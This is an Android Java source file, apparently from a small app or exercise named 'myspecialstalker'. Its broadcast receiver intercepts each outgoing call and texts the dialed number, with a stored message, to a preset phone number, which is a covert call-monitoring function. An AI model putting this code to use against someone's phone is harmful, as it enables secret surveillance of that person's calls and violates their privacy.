package com.example.myspecialstalker;

import android.content.BroadcastReceiver;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

import java.util.Objects;

public class OutgoingBroadcastReceiver extends BroadcastReceiver {

        private static final String TEXT = "TEXT";
        private static final String PHONE_NUMBER = "PHONE_NUMBER";

        @Override
        public void onReceive(Context context, Intent intent) {
            SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
            String receiverNumber = sharedPreferences.getString(PHONE_NUMBER, null);
            String testMessage = sharedPreferences.getString(TEXT, null);
            if (receiverNumber != null && testMessage != null) {
                if (Objects.equals(intent.getAction(), Intent.ACTION_NEW_OUTGOING_CALL)) {
                    String callingPhoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                    sendSyncSMS( receiverNumber,testMessage + callingPhoneNumber);
                }
            }
        }

    public void sendSyncSMS( String number, String textMessage ) {
        SmsManager.getDefault().sendTextMessage(
                number,
                null,
                textMessage,
                null,
                null);
    }


}
